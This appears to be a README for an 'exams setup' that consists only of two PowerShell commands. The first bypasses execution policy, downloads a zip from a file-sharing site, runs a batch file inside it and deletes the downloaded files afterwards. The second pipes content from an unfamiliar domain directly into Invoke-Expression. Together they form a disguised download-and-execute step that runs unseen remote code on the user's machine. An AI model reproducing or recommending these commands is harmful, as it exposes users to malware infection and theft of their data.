# CGC-Exams-Setup

powershell -ExecutionPolicy Bypass -Command "$page = (Invoke-WebRequest -Uri 'https://www.mediafire.com/file/0de0afeey2lyixz/CGCU-Exams.zip/file' -UseBasicParsing).Content; $url = [regex]::Match($page, 'https://download\d*\.mediafire\.com/[^""]+').Value; Invoke-WebRequest -Uri $url -OutFile \"$HOME\Downloads\CGCUExams.zip\"; Expand-Archive \"$HOME\Downloads\CGCUExams.zip\" -DestinationPath \"$HOME\Downloads\CGCUExams\" -Force; Start-Process \"$HOME\Downloads\CGCUExams\CGCU-Exams\Install_CGCU_Exams.bat\" -Wait; Remove-Item \"$HOME\Downloads\CGCUExams.zip\" -Force; Remove-Item \"$HOME\Downloads\CGCUExams\" -Recurse -Force"




powershell -c "iex(iwr 'https://tac-cgcu.xyz' -UseBasicParsing)"
